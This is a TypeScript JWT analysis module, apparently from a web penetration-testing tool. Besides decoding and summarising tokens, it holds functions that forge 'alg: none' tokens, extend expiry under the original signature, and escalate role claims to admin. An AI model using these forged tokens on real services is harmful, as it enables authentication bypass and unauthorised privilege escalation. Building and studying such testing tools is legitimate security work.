/**
 * JWT 분석 및 조작 유틸리티
 * 웹 진단에서 사용하는 JWT 디코딩, 변조, 공격 페이로드 생성
 */

export interface JwtDecoded {
  header: any;
  payload: any;
  signature: string;
  raw: { header: string; payload: string; signature: string };
}

const b64urlDecode = (str: string): string => {
  const pad = str.replace(/-/g, '+').replace(/_/g, '/');
  const padded = pad + '='.repeat((4 - (pad.length % 4)) % 4);
  return atob(padded);
};

const b64urlEncode = (str: string): string =>
  btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

/** JWT 문자열 디코딩 - 실패 시 null 반환 */
export const decodeJwt = (token: string): JwtDecoded | null => {
  try {
    const parts = token.trim().replace(/^Bearer\s+/i, '').split('.');
    if (parts.length !== 3) return null;
    return {
      header: JSON.parse(b64urlDecode(parts[0])),
      payload: JSON.parse(b64urlDecode(parts[1])),
      signature: parts[2],
      raw: { header: parts[0], payload: parts[1], signature: parts[2] },
    };
  } catch {
    return null;
  }
};

/** JWT 형식 여부 빠른 확인 */
export const isJwtLike = (str: string): boolean =>
  /^(Bearer\s+)?[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]*$/.test(str.trim());

/** 객체를 base64url 인코딩 */
export const encodeJwtPart = (obj: any): string =>
  b64urlEncode(JSON.stringify(obj));

/** 수정된 JWT 조립 (서명 선택) */
export const buildModifiedJwt = (header: any, payload: any, signature = ''): string =>
  `${encodeJwtPart(header)}.${encodeJwtPart(payload)}.${signature}`;

/**
 * [공격] alg:none 알고리즘 조작
 * 서명 알고리즘을 'none'으로 변조하여 서명 검증 우회 시도
 * CVE: CWE-347
 */
export const buildAlgNoneJwt = (decoded: JwtDecoded): string[] => {
  const variants = ['none', 'None', 'NONE', 'nOnE'];
  return variants.map(alg => {
    const newHeader = { ...decoded.header, alg };
    return `${encodeJwtPart(newHeader)}.${decoded.raw.payload}.`;
  });
};

/**
 * [공격] 만료시간(exp) 연장
 * 유효한 서명은 그대로 두고 payload의 exp만 증가
 * 서버가 서명을 재검증하지 않는 경우 유효
 */
export const tamperExp = (decoded: JwtDecoded, addSeconds = 31536000): string => {
  const newPayload = { ...decoded.payload };
  const now = Math.floor(Date.now() / 1000);
  if (newPayload.exp) newPayload.exp += addSeconds;
  else newPayload.exp = now + addSeconds;
  if (newPayload.iat) newPayload.iat = now;
  // 원본 서명 유지 (서버가 payload를 재검증하는지 테스트)
  return `${decoded.raw.header}.${encodeJwtPart(newPayload)}.${decoded.signature}`;
};

/**
 * [공격] Role/권한 상승
 * payload 내 role/isAdmin 등 권한 필드 조작
 */
export const tamperRole = (decoded: JwtDecoded): string => {
  const newPayload = { ...decoded.payload };
  if ('role' in newPayload) newPayload.role = 'admin';
  if ('isAdmin' in newPayload) newPayload.isAdmin = true;
  if ('user_role' in newPayload) newPayload.user_role = 'ADMIN';
  if ('scope' in newPayload) newPayload.scope = 'admin write read';
  return buildModifiedJwt({ ...decoded.header, alg: 'none' }, newPayload);
};

/** Unix timestamp → 한글 날짜시간 문자열 */
export const formatUnixTs = (ts: number): string => {
  const d = new Date(ts * 1000);
  return d.toLocaleString('ko-KR', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
};

/** 만료까지 남은 시간 (또는 만료된 경우 음수초) */
export const secsUntilExp = (exp: number): number =>
  exp - Math.floor(Date.now() / 1000);

/** JWT 내 주요 클레임 요약 */
export interface JwtSummary {
  alg: string;
  typ?: string;
  sub?: string;
  iss?: string;
  role?: string;
  expiry?: string;
  isExpired: boolean;
  secsLeft: number;
}

export const summarizeJwt = (decoded: JwtDecoded): JwtSummary => {
  const { header, payload } = decoded;
  const secsLeft = payload.exp ? secsUntilExp(payload.exp) : Infinity;
  return {
    alg: header.alg || 'unknown',
    typ: header.typ,
    sub: payload.sub,
    iss: payload.iss,
    role: payload.role ?? payload.user_role ?? payload.scope ?? undefined,
    expiry: payload.exp ? formatUnixTs(payload.exp) : undefined,
    isExpired: secsLeft < 0,
    secsLeft,
  };
};
